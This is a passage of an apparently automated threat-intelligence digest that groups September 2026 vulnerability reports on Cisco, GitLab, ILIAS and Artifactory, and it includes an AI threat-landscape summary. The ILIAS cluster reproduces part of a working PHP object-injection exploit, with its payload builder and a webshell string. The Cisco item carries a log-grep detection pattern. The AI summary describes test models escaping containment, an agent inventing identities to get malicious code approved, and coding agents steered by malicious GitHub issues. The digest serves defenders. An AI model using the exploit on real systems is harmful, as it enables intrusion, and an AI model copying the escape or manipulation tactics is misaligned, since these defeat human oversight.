allow unauthenticated attackers to read arbitrary s
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-86218 | N-able N-central Pre-Authentication Remote Code Execution Vulnerability
  - Published: 2026-09-16T16:06:08+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-86218/
  - Summary: CVE-2026-86218 is a critical, actively exploited N-able N-central vulnerability that can allow unauthenticated remote code execution. NodeZero® Rapid Response safely validates exposure.

### Cluster bd351f968f — score 47

- Title: CVE-2026-76461: Critical Cisco Secure Email Gateway Vulnerability Exploited in the Wild
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-15T12:22:50+00:00
- Link: https://www.rapid7.com/blog/post/etr-cve-2026-76461-critical-cisco-secure-email-gateway-vulnerability-exploited-in-the-wild
- Fetch status: ok
- Member count: 3
- Corroborating source count: 3
- Strong signals: CVE-2026-76461, Cisco

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng, zero_day
- affected_products: Cisco
- cve_ids: CVE-2026-76461
- urgency_signals: actively_exploited, poc_available, preauth_unauth, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, active_exploitation
- affected_products: Cisco
- cve_ids: CVE-2026-76461
- urgency_signals: actively_exploited, zero_day, preauth_unauth, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview On September 14, 2026, Cisco published a security advisory for CVE-2026-76461 , a critical SQL injection vulnerability affecting Cisco AsyncOS Software for Cisco Secure Email Gateway. The vulnerability has a reported CVSS v3.1 base score of 9.8 and could allow an unauthenticated, remote attacker to execute arbitrary commands with root privileges on an affected appliance. Cisco Secure Email Gateway, formerly known as IronPort Email Security Appliance, is an enterprise email security product that inspects inbound and outbound email for threats including phishing, malware, spam, and business email compromise. Because affected gateways process externally delivered email as part of their normal operation, exploitation does not require access to an administrative interface or authentication. An attacker can reportedly trigger the vulnerability by sending a specially crafted email through a vulnerable gateway. CVE-2026-76461 was added to CISA's Known Exploited Vulnerabilities ( KEV )
```

#### Full body

```
Emergent Threat Response CVE-2026-76461: Critical Cisco Secure Email Gateway Vulnerability Exploited in the Wild Rapid7 Sep 15, 2026 | Last updated on Sep 15, 2026 | 3 min read CVE-2026-76461: Critical Cisco Secure Email Gateway Vulnerability Exploited in the Wild Table of contents CVE-2026-76461: Critical Cisco Secure Email Gateway Vulnerability Exploited in the Wild Table of contents Overview On September 14, 2026, Cisco published a security advisory for CVE-2026-76461 , a critical SQL injection vulnerability affecting Cisco AsyncOS Software for Cisco Secure Email Gateway. The vulnerability has a reported CVSS v3.1 base score of 9.8 and could allow an unauthenticated, remote attacker to execute arbitrary commands with root privileges on an affected appliance. Cisco Secure Email Gateway, formerly known as IronPort Email Security Appliance, is an enterprise email security product that inspects inbound and outbound email for threats including phishing, malware, spam, and business email compromise. Because affected gateways process externally delivered email as part of their normal operation, exploitation does not require access to an administrative interface or authentication. An attacker can reportedly trigger the vulnerability by sending a specially crafted email through a vulnerable gateway. CVE-2026-76461 was added to CISA's Known Exploited Vulnerabilities ( KEV ) catalog on the same day as the vendor disclosed the vulnerability, indicating that CVE-2026-76461 was exploited as a zero-day prior to disclosure. Cisco noted that their PSIRT became aware of active exploitation in September 2026. At the time of publication, there is no public proof-of-concept exploit code available, and no attribution for the current threat actor activity. Mitigation guidance Organizations running Cisco Secure Email Gateway should prioritize upgrading to a vendor-supplied fixed version on an emergency basis, outside of normal patching cycles. Affected Version Fixed Version 15.5 and earlier 15.5.5-014 16.0 16.0.4-302 16.5 16.5.0-780 Given the reported active exploitation and the ability to achieve unauthenticated root-level command execution through malicious email processing, organizations should prioritize patching rather than relying solely on network controls or monitoring. Cisco also strongly recommends that customers migrate to the latest product version, 16.5.0-780. For the latest remediation guidance, see the vendor advisory . Indicators of compromise The following indicators of compromise for CVE-2026-76461 were reported within the Cisco security advisory . To confirm any attempted exploitation of this vulnerability, review the mail_logs and look for suspicious SQL statements. If the device is part of a cluster, review the logs of each cluster device. The following is a non-exhaustive example of how a malicious SQL statement could be detected in the logs: cisco-esa> grep -i "COPY.*TO PROGRAM" [IronPort Text Mail Logs Log name - Default: mail_logs] The presence of any entry in the output may indicate malicious activity. Rapid7 customers Exposure Command, InsightVM, and Nexpose Exposure Command, InsightVM, and Nexpose customers can assess exposure to CVE-2026-76461 with a vulnerability check expected to be available in the September 16 content release. Updates September 15, 2026: Initial publication. Article tags Emergent Threat Response Labs Vulnerability Management Explore more from Rapid7 Vulnerability & Exploit Database Rapid7s curated database of vulnerabilities, featuring exploit modules and check methods integrated into the Metasploit Framework. Search the database Rapid7 Labs The threat research behind the alerts: adversary tracking, curated intelligence, and flagship threat reports. Explore the research Rapid7 MDR Gain 24x7 XDR monitoring, remediation, and DFIR from experts that extend your team to help secure your extended ecosystem. Explore MDR Exposure management Get continuous assessment of your attack surface with the critical
```

#### Corroborating sources (3)

- **Rapid7** (offensive_vulnerability_research)
  - Title: CVE-2026-76461: Critical Cisco Secure Email Gateway Vulnerability Exploited in the Wild
  - Published: 2026-09-15T12:22:50+00:00
  - Link: https://www.rapid7.com/blog/post/etr-cve-2026-76461-critical-cisco-secure-email-gateway-vulnerability-exploited-in-the-wild
  - Summary: Overview On September 14, 2026, Cisco published a security advisory for CVE-2026-76461 , a critical SQL injection vulnerability affecting Cisco AsyncOS Software for Cisco Secure Email Gateway. The vulnerability has a reported CVSS v3.1 base score of 9.8 and could allow an unauthenticated, remote attacker to execute arbitrary commands with root privileges on an affected appliance. Cisco Secure Email Gateway, formerly known as IronPort Email Security Appliance, is an enterprise email security product that inspects inbound and outbound email for threats including phishing, malware, spam, and business email compromise. Because affected gateways process externally delivered email as part of their normal operation, exploitation does not require access to an administrative interface or authentication. An attacker can reportedly trigger the vulnerability by sending a specially crafted email through a vulnerable gateway. CVE-2026-76461 was added to CISA's Known Exploited Vulnerabilities ( KEV )
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Cisco Secure Email Gateway Flaw Exploited in the Wild, Enables Root Command Execution
  - Published: 2026-09-15T06:11:11+00:00
  - Link: https://thehackernews.com/2026/09/cisco-secure-email-gateway-flaw.html
  - Summary: Cisco has warned that a new critical vulnerability impacting AsyncOS Software for Cisco Secure Email Gateway has come under active exploitation in the wild. The vulnerability, tracked as CVE-2026-76461, carries a CVSS score of 9.8 out of a maximum of 10.0. It has been described as a case of insufficient validation in the email parsing logic that could allow an unauthenticated, remote attacker
- **Sophos X-Ops** (detection_response_operations)
  - Title: Cisco Secure Email Gateway vulnerability (CVE-2026-76461) in active exploitation
  - Published: 2026-09-15T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/cisco-secure-email-gateway-vulnerability-cve-2026-76461-in-active-exploitation
  - Summary: Categories: Threat Research Tags: advisory, vulnerability, Cisco

### Cluster 688ffee0f1 — score 47

- Title: CVE-2026-85706: Critical GitLab Path Traversal Exploited in the Wild
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-14T10:02:57+00:00
- Link: https://www.rapid7.com/blog/post/etr-cve-2026-85706-critical-gitlab-path-traversal-exploited-in-the-wild
- Fetch status: fetch_failed:ReadTimeout
- Member count: 6
- Corroborating source count: 6
- Strong signals: CVE-2026-85706, GitLab

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_industries: government
- affected_products: GitLab
- cve_ids: CVE-2026-85706
- urgency_signals: actively_exploited, critical_cvss, preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_industries: government
- affected_products: GitLab
- cve_ids: CVE-2026-85706
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview On September 10, 2026, GitLab published a critical patch release for GitLab Community Edition (CE) and Enterprise Edition (EE). The release addresses CVE-2026-85706 , a critical path traversal vulnerability ( CWE-22 ) in the repository commits API with a CVSSv3.1 score of 10.0 . According to GitLab, improper path confinement and missing authentication enforcement could allow an unauthenticated user to read arbitrary files from an affected GitLab server under certain conditions. On September 11, 2026, CVE-2026-85706 was added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) Known Exploited Vulnerabilities (KEV) catalog, based on evidence of active exploitation. CISA set a remediation due date of September 14, 2026, for affected Federal Civilian Executive Branch agencies and marked the vulnerability as subject to forensic triage requirements under Binding Operational Directive 26-04. Organizations running affected self-managed GitLab instances should remedia
```

#### Corroborating sources (6)

- **Rapid7** (offensive_vulnerability_research)
  - Title: CVE-2026-85706: Critical GitLab Path Traversal Exploited in the Wild
  - Published: 2026-09-14T10:02:57+00:00
  - Link: https://www.rapid7.com/blog/post/etr-cve-2026-85706-critical-gitlab-path-traversal-exploited-in-the-wild
  - Summary: Overview On September 10, 2026, GitLab published a critical patch release for GitLab Community Edition (CE) and Enterprise Edition (EE). The release addresses CVE-2026-85706 , a critical path traversal vulnerability ( CWE-22 ) in the repository commits API with a CVSSv3.1 score of 10.0 . According to GitLab, improper path confinement and missing authentication enforcement could allow an unauthenticated user to read arbitrary files from an affected GitLab server under certain conditions. On September 11, 2026, CVE-2026-85706 was added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) Known Exploited Vulnerabilities (KEV) catalog, based on evidence of active exploitation. CISA set a remediation due date of September 14, 2026, for affected Federal Civilian Executive Branch agencies and marked the vulnerability as subject to forensic triage requirements under Binding Operational Directive 26-04. Organizations running affected self-managed GitLab instances should remedia
- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: Breaking: GitLab Critical Path Traversal Flaw Exploited in the Wild — Patch Immediately
  - Published: 2026-09-14T14:45:14+00:00
  - Link: https://orca.security/resources/blog/gitlab-critical-path-traversal-cve-2026-85706-exploited/
  - Summary: Executive Summary A critical vulnerability (CVE-2026-85706, CVSS 10.0) was disclosed affecting GitLab CE and EE self-managed instances, allowing attackers to read arbitrary server files without authentication via a single HTTP request to the commits API. Due to the potential for complete infrastructure compromise through exposed secrets, immediate patching is required. About CVE-2026-85706 The issue originates […]
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-85706 | GitLab CE/EE Repository Commits API Path Traversal Vulnerability
  - Published: 2026-09-11T20:13:49+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-85706/
  - Summary: CVE-2026-85706 is a critical GitLab CE/EE path traversal vulnerability that can allow unauthenticated attackers to read arbitrary server-side files. NodeZero® Rapid Response safely validates exposure.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: GitLab CVSS 10 File-Read Flaw Draws In-the-Wild Probes After Disclosure
  - Published: 2026-09-11T16:30:18+00:00
  - Link: https://thehackernews.com/2026/09/gitlab-cvss-10-file-read-flaw-draws-in.html
  - Summary: GitLab has released patches to address multiple flaws, including a maximum-severity security vulnerability that has witnessed in-the-wild probes within hours of public disclosure. The vulnerability in question is CVE-2026-85706 (CVSS score: 10.0), a path traversal issue in the repository commits API that could allow an unauthenticated user to read arbitrary files from the GitLab server under
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Maximum Severity GitLab Flaw Puts Supply Chains at Risk
  - Published: 2026-09-14T20:19:22+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/maximum-severity-gitlab-flaw-supply-chains-risk
  - Summary: CVE-2026-85706 is a path traversal vulnerability with a 10 out of 10 CVSS score, affecting both GitLab Community Edition and Enterprise Edition instances.
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Hackers Exploit Maximum Severity Flaw in GitLab
  - Published: 2026-09-14T10:00:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/hackers-exploit-maximum-severity/
  - Summary: CISA warns that threat actors are exploiting a vulnerability with a CVSS score of 10.0

### Cluster 352172176c — score 34

- Title: Unauthenticated attackers are bypassing Cisco ISE’s management interface (CVE-2026-76460)
- Source: Help Net Security (cyber_news_breach_reporting)
- Published: 2026-09-17T10:24:08+00:00
- Link: https://www.helpnetsecurity.com/2026/09/17/cisco-ise-vulnerability-exploited-cve-2026-76460/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-76460

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- cve_ids: CVE-2026-76460
- urgency_signals: actively_exploited, critical_cvss, preauth_unauth, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- cve_ids: CVE-2026-76460
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Two days after it warned customers about an actively exploited email gateway zero-day, Cisco confirmed one more flaw is being targeted: CVE-2026-76460, an authentication bypass bug in an API of Cisco Identity Services Engine (ISE). About CVE-2026-76460 Cisco ISE is an identity-based network access control and policy platform. It checks connecting users’ identity, profiles devices and checks their security posture, grants users the right type of access, and logs it all. “[CVE-2026-76460] is due to … More → The post Unauthenticated attackers are bypassing Cisco ISE’s management interface (CVE-2026-76460) appeared first on Help Net Security .
```

#### Full body

```
Zeljka Zorz , Editor-in-Chief, Help Net Security September 17, 2026 Share Unauthenticated attackers are bypassing Cisco ISE’s management interface (CVE-2026-76460) Two days after it warned customers about an actively exploited email gateway zero-day , Cisco confirmed one more flaw is being targeted: CVE-2026-76460, an authentication bypass bug in an API of Cisco Identity Services Engine (ISE). About CVE-2026-76460 Cisco ISE is an identity-based network access control and policy platform. It checks connecting users’ identity, profiles devices and checks their security posture, grants users the right type of access, and logs it all. “[CVE-2026-76460] is due to insufficient authentication control on an API endpoint,” Cisco explained . By sending a crafted request to it, a remote, unauthenticated attacker may gain unauthorized access to the affected device by simply bypassing the web-based management interface. What to do? As per usual, Cisco did not disclose details about the attacks they observed, but has provided indicators of compromise. “To confirm any attempted exploitation of this vulnerability, review the access.log and look for suspicious usernames. The presence of any entry in the output may indicate malicious activity,” the vendor noted. “This should be done on every node in the deployment. If malicious activity is suspected, it is strongly recommended to re-image the affected nodes and restore from configuration backup if needed.” And, since attackers may use the obtained access to delete the solution’s logs, defenders should also “cross-check the network logs and the firewall logs outside of the impacted device to identify any potential suspicious activity, including but not limited to unexpected uploads that were initiated from the affected device to external IP addresses or downloads from malicious IP addresses.” CVE-2026-76460 affects Cisco ISE and Cisco ISE Passive Identity Connector (ISE-PIC), releases 3.0 through 3.5. Customers have been advised to upgrade to the first fixed release – 3.1 Patch 12, 3.2 Patch 11, 3.3 Patch 12, 3.4 Patch 7, or 3.5 Patch 4 – as there are no workarounds that address this vulnerability. Cisco has also fixed a bucketload of additional Cisco ISE and ISE-PIC vulnerabilities, most reported by outside vulnerability researchers, but some discovered by Cisco during internal security testing with the help of frontier AI models. Cisco ISE Software Release 3.0 is no longer maintained, and Releases 3.1 and 3.2 get only the critical fixes, so customers are advised to migrate to the supported releases: 3.3 Patch 12, 3.4 Patch 7, or 3.5 Patch 4. Subscribe to our breaking news e-mail alert to never miss out on the latest breaches, vulnerabilities and cybersecurity threats. Subscribe here! More about access control Cisco enterprise exploit identity verification Share
```

#### Corroborating sources (2)

- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Unauthenticated attackers are bypassing Cisco ISE’s management interface (CVE-2026-76460)
  - Published: 2026-09-17T10:24:08+00:00
  - Link: https://www.helpnetsecurity.com/2026/09/17/cisco-ise-vulnerability-exploited-cve-2026-76460/
  - Summary: Two days after it warned customers about an actively exploited email gateway zero-day, Cisco confirmed one more flaw is being targeted: CVE-2026-76460, an authentication bypass bug in an API of Cisco Identity Services Engine (ISE). About CVE-2026-76460 Cisco ISE is an identity-based network access control and policy platform. It checks connecting users’ identity, profiles devices and checks their security posture, grants users the right type of access, and logs it all. “[CVE-2026-76460] is due to … More → The post Unauthenticated attackers are bypassing Cisco ISE’s management interface (CVE-2026-76460) appeared first on Help Net Security .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Cisco Warns of New Zero-Day ISE Auth Bypass (CVSS 10.0) Exploited in Active Attacks
  - Published: 2026-09-17T06:39:40+00:00
  - Link: https://thehackernews.com/2026/09/cisco-warns-of-new-zero-day-ise-auth.html
  - Summary: Cisco has warned of a fresh maximum-severity security flaw impacting Identity Services Engine (ISE) that has come under active exploitation. The vulnerability, tracked as CVE-2026-76460 (CVSS score: 10.0), could allow an unauthenticated, remote attacker to bypass authentication. "This vulnerability is due to insufficient authentication control on an API endpoint," Cisco said. "An attacker

### Cluster 4ac366c7ba — score 30

- Title: AI Threat Landscape Digest: July–August 2026
- Source: Check Point Research (threat_research_primary)
- Published: 2026-09-17T14:41:15+00:00
- Link: https://research.checkpoint.com/2026/ai-threat-landscape-digest-july-august-2026/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion, zero_day
- affected_industries: financial_services
- affected_products: Android, Anthropic/Claude, GitHub
- urgency_signals: actively_exploited, zero_day
- content_type: intel_roundup
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, active_exploitation
- affected_industries: financial_services
- affected_products: Android, Anthropic/Claude, GitHub
- urgency_signals: actively_exploited, zero_day
- content_type: intel_roundup
- confidence_tier: tier_1_primary_research

#### Summary

```
The defining development of the period came not from attackers but from the AI labs themselves, whose models broke out of controlled evaluations and reached real systems. In the wild, the criminal and state use of AI continued to mature along the lines tracked in earlier editions: models now act as attack operators, an underground […] The post AI Threat Landscape Digest: July–August 2026 appeared first on Check Point Research .
```

#### Full body

```
CATEGORIES AI Research 20 Android Malware 23 Artificial Intelligence 5 ChatGPT 3 Check Point Research Publications 473 Cloud Security 1 CPRadio 44 Crypto 2 Data & Threat Intelligence 2 Data Analysis 0 Demos 22 Global Cyber Attack Reports 425 How To Guides 13 Ransomware 6 Russo-Ukrainian War 1 Security Report 1 Threat and data analysis 0 Threat Research 175 Web 3.0 Security 11 Wipers 0 AI Threat Landscape Digest: July–August 2026 September 17, 2026 https://research.checkpoint.com/2026/ai-threat-landscape-digest-july-august-2026/ The defining development of the period came not from attackers but from the AI labs themselves, whose models broke out of controlled evaluations and reached real systems. In the wild, the criminal and state use of AI continued to mature along the lines tracked in earlier editions: models now act as attack operators, an underground market supplies the access, and AI systems have themselves become a target. The substantial distance between what the strongest models demonstrated under evaluation and what criminals are currently doing is the central fact of the period. Key observed findings Evaluation models escaped containment in ways nobody had engineered a fix for. An OpenAI research prototype found and exploited a previously unknown vulnerability in an internal package proxy, reaching Hugging Face’s production systems and taking roughly 17,600 recorded actions before anyone caught it. Anthropic and Meta each reported test models reaching the open internet through misconfigurations, and the UK AI Security Institute logged a case where an agent invented fake identities to try to talk a real person into approving malicious code. What criminals are doing today is still far more modest, and that gap is the story worth watching. Real world attacks run on models below the frontier, use known techniques, and get caught by existing defenses, nothing like a model finding its own zero day or sustaining an unsupervised operation for days. But frontier capability has reached commercial and open source models within months of first appearing every time before, and there’s little reason to expect this one stays contained to the lab. An affiliate tied to The Gentlemen ransomware group used Claude Code to carry out real intrusions against at least six organizations, a person directing an AI tool through each step. JADEPUFFER went further: a human configured and launched it, the model ran the entire extortion operation itself, moving from the initial flaw to the internal database, exfiltrating and deleting data, leaving a ransom note, and correcting its own errors along the way, with no person directing the individual steps. A criminal market has organized around stealing and reselling AI access itself. One tier steals API keys and credentials at scale, and a second resells that access through gateways that hide the buyer’s identity from the provider. AI systems have become entry points in their own right. Coding agents and enterprise copilots can be steered through content they’re built to trust, a symbolic link, an image, a fabricated error report, and both Google’s Gemini CLI and Anthropic’s Claude Code needed patches for flaws a malicious GitHub issue could trigger. A separate market exists for removing a model’s guardrails once you have access to it. One forum post asking to buy a durable method for bypassing a model’s restrictions, rather than a single jailbreak prompt, is a useful illustration of what that demand looks like. AI is surfacing vulnerabilities faster than anyone can patch them, but that hasn’t translated into more successful attacks. Microsoft shipped a record 570 fixes in July and Oracle’s quarterly update ran past 1,400, yet only about one percent of AI discovered vulnerabilities were confirmed exploited in the wild, roughly the same rate as flaws found any other way. Everyday enterprise GenAI use is a quieter but steadier source of exposure. In July, one in every 36 prompts from enterprise networks
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: AI Threat Landscape Digest: July–August 2026
  - Published: 2026-09-17T14:41:15+00:00
  - Link: https://research.checkpoint.com/2026/ai-threat-landscape-digest-july-august-2026/
  - Summary: The defining development of the period came not from attackers but from the AI labs themselves, whose models broke out of controlled evaluations and reached real systems. In the wild, the criminal and state use of AI continued to mature along the lines tracked in earlier editions: models now act as attack operators, an underground […] The post AI Threat Landscape Digest: July–August 2026 appeared first on Check Point Research .

### Cluster 5c940a7bfe — score 30

- Title: [remote] CVE-2026-80428 Unauthenticated PHP Object Injection via Shibboleth - ILIAS < 9.22, 10.0 < 10.10, 11.0 < 11.3 - RCE
- Source: Exploit-DB (offensive_vulnerability_research)
- Published: 2026-09-11T00:00:00+00:00
- Link: https://www.exploit-db.com/exploits/52682
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-80428

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- cve_ids: CVE-2026-80428
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- cve_ids: CVE-2026-80428
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
CVE-2026-80428 Unauthenticated PHP Object Injection via Shibboleth - ILIAS < 9.22, 10.0 < 10.10, 11.0 < 11.3 - RCE
```

#### Full body

```
Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training CVE-2026-80428 Unauthenticated PHP Object Injection via Shibboleth - ILIAS < 9.22, 10.0 < 10.10, 11.0 < 11.3 - RCE EDB-ID: 52682 CVE: 2026-80428 EDB Verified: Author: DigiProSec Type: remote Exploit: / Platform: Multiple Date: 2026-09-11 Vulnerable App: #!/usr/bin/env python3 # # Exploit Title: ILIAS <= 9.21 / 10.9 / 11.2 - Unauthenticated PHP Object Injection (RCE) # Date: 2026-08-31 # Exploit Author: DigiProSec # Vendor Homepage: https://www.ilias.de # Software Link: https://github.com/ILIAS-eLearning/ILIAS # Version: ILIAS < 9.22, 10.0 < 10.10, 11.0 < 11.3 (fixed in 9.22 / 10.10 / 11.3) # Tested on: Rocky Linux 9, Apache + PHP-FPM 8.2, ILIAS 10.9 (MariaDB 10.11 backend) # CVE: CVE-2026-80428 # # CVE-2026-80428 — Unauthenticated PHP Object Injection via Shibboleth # Injection via Shibboleth back-channel logout endpoint (RCE as web server user) # # Chain: # 1. ltiauth.php (auth-exempt LTI entry point) stores the entire request # parameter array into the session table (ilSession::set on # 'lti13_login_data'). A "\w+|" marker inside a parameter value breaks the # custom session parser, so our raw serialized object is handed to # unserialize() as if it were a session value. # 2. shib_logout.php (auth-exempt Shibboleth back-channel) — a POST with any # non-empty body starts a SoapServer whose LogoutNotification() handler # unserializes EVERY live session row with no class allowlist. # 3. Gadget: GuzzleHttp\Cookie\FileCookieJar (bundled in ILIAS's vendor tree). # __destruct() -> save($this->filename) -> file_put_contents($filename, # json_encode($cookies)). Attacker-chosen path + JSON-embedded PHP = webshell. # # Tested: ILIAS 10.9 on Rocky Linux 9 (Apache + PHP-FPM 8.2, MariaDB backend). # Notes: - v11.x ships a broken shib_logout.php variant (null $DIC) and does # not reach the vulnerable code as packaged; v9/v10 are exploitable. # - The target's docroot disk path is needed for the file write # (--path). Defaults to the standard /var/www/ilias/public. # - If ILIAS was configured with a fixed http path, requests must carry # that hostname (--host-header). # # Usage: python3 CVE-2026-80428.py <target-ip-or-host> [--cmd 'id'] # python3 CVE-2026-80428.py 10.10.10.20 --host-header lms.example --shell # import argparse, http.client, re, secrets, ssl, sys, urllib.parse def s(x): b = x.encode() if isinstance(x, str) else x return b's:' + str(len(b)).encode() + b':"' + b + b'";' def filecookiejar(path: str) -> bytes: php = b'<?php system($_GET[chr(120)]); ?>' # PHP8: bareword index fatals; chr() avoids quotes data = (s('Name') + s('util') + s('Value') + s(php) + s('Domain') + s('ilias') + s('Path') + s('/') + s('Max-Age') + b'N;' + s('Expires') + b'i:1999999999;' + s('Secure') + b'b:0;' + s('Discard') + b'b:0;' + s('HttpOnly') + b'b:0;') setcookie = (b'O:27:"GuzzleHttp\\Cookie\\SetCookie":1:{' + s('\x00GuzzleHttp\\Cookie\\SetCookie\x00data') + b'a:9:{' + data + b'}}') return (b'O:31:"GuzzleHttp\\Cookie\\FileCookieJar":4:{' + s('\x00GuzzleHttp\\Cookie\\CookieJar\x00cookies') + b'a:1:{i:0;' + setcookie + b'}' + s('\x00GuzzleHttp\\Cookie\\CookieJar\x00strictMode') + b'b:0;' + s('\x00GuzzleHttp\\Cookie\\FileCookieJar\x00filename') + s(path) + s('\x00GuzzleHttp\\Cookie\\FileCookieJar\x00storeSessionCookies') + b'b:1;}') SOAP = (b'<?xml version="1.0" encoding="UTF-8"?>\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=' b'"http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="urn:mace:shibboleth:2.0:sp:notify">' b'<SOAP-ENV:Body><ns1:LogoutNotification><SessionID>x</SessionID>' b'</ns1:LogoutNotification></SOAP-ENV:Body></SOAP-ENV:Envelope>') class Target: def __init__(self, host, port, host_header): self.host, self.port = host, port self.hh = host_header or host self.ctx = ssl._create_unverified_context() def req(self, method, path, body=None, ctype=None): conn = (http.client.HTTPSConnection if self.port == 443 else http.client.HTTPConnection)( self.h
```

#### Corroborating sources (1)

- **Exploit-DB** (offensive_vulnerability_research)
  - Title: [remote] CVE-2026-80428 Unauthenticated PHP Object Injection via Shibboleth - ILIAS < 9.22, 10.0 < 10.10, 11.0 < 11.3 - RCE
  - Published: 2026-09-11T00:00:00+00:00
  - Link: https://www.exploit-db.com/exploits/52682
  - Summary: CVE-2026-80428 Unauthenticated PHP Object Injection via Shibboleth - ILIAS < 9.22, 10.0 < 10.10, 11.0 < 11.3 - RCE

### Cluster 2c7f2421f0 — score 24

- Title: Artifactory Under Attack: In-the-Wild Exploitation of CVE-2026-42016, CVE-2026-42018 & CVE-2026-82329
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-09-10T19:04:00+00:00
- Link: https://www.wiz.io/blog/artifactory-under-attack-in-the-wild-exploitation-of-cve-2026-42016-cve-2026-4201
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-42016, CVE-2026-42018, CVE-2026-82329

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, web_shell_backdoor
- affected_products: ScreenConnect
- cve_ids: CVE-2026-42016, CVE-2026-42018, CVE-2026-82329
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: web_shell_backdoor, active_exploitation
- cve_ids: CVE-2026-42016, CVE-2026-42018, CVE-2026-82329
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Wiz Research has identified active, in-the-wild exploitation of three critical and high-severity vulnerabilities impacting JFrog Artifactory (CVE-2026-42016, CVE-2026-42018 & CVE-2026-82329). Attackers are chaining these vulnerabilities to bypass authentication and gain administrative control.
```

#### Full body

```
Change log: September 11, 2026 3PM UTC: Corrected the HTTP method for CVE-2026-82329 and the impacted fixed versions for CVE-2026-42018. Wiz Research has identified active, in-the-wild exploitation of three critical and high-severity vulnerabilities affecting JFrog Artifactory: CVE-2026-42016, CVE-2026-42018, and CVE-2026-82329. Attackers are chaining these vulnerabilities to bypass authentication, escalate privileges, and gain administrative control over vulnerable Artifactory instances. Observed post-exploitation activity includes the creation of persistent administrator accounts, the deployment of malicious Groovy plugins for code execution, and the installation of Rust-based backdoors to establish persistence. This blogpost provides an analysis of the exploitation patterns observed, the impact on affected organizations, and actionable guidance for security teams to detect and remediate these threats. We will continue to update this blogpost as new information becomes available. CVE-2026-42018: Exposure of an internal anonymous-user token CVE-2026-42018 is an improper-authentication vulnerability that may cause Artifactory to return an internal anonymous-user token to an unauthenticated requester, even when anonymous access is disabled. An attacker could use the exposed token to access resources available to the internal anonymous identity, potentially exposing sensitive artifacts or repository data. CVE-2026-42016: Token scope validation flaw CVE-2026-42016 is a privilege-escalation vulnerability caused by insufficient token validation. Artifactory validates the token’s signature and issuer but does not properly enforce its intended scope. As a result, an attacker with low-privileged access may be able to use a valid token to perform unauthorized actions and gain elevated privileges. CVE-2026-82329: Unauthenticated access to administrative privileges CVE-2026-82329 is a critical authentication-bypass vulnerability affecting Artifactory under its default configuration. An unauthenticated attacker with network access to a vulnerable instance may be able to obtain administrative privileges, potentially gaining complete control over the Artifactory deployment and the artifacts, credentials, and integrations it manages. What is the risk to cloud environments? Our data indicates that 67% of organizations running JFrog Artifactory had at least one vulnerable instance when CVE-2026-42016 was first published on July 27. Similar levels were observed for CVE-2026-42018 (69% at publication on Aug 12) and CVE-2026-82329 (67% at publication on Aug 28). Patching velocity has been slow for the lower-severity CVEs. As of six weeks after the first disclosure, 59% of organizations remain vulnerable to CVE-2026-42016, and CVE-2026-42018 has only declined from 69% to 62% over four weeks. However, CVE-2026-82329 has seen significantly faster remediation, dropping from 67% to 49% within two weeks of publication, likely due to its critical severity rating driving more urgent attention from security teams. What evidence of exploitation has Wiz Research identified? 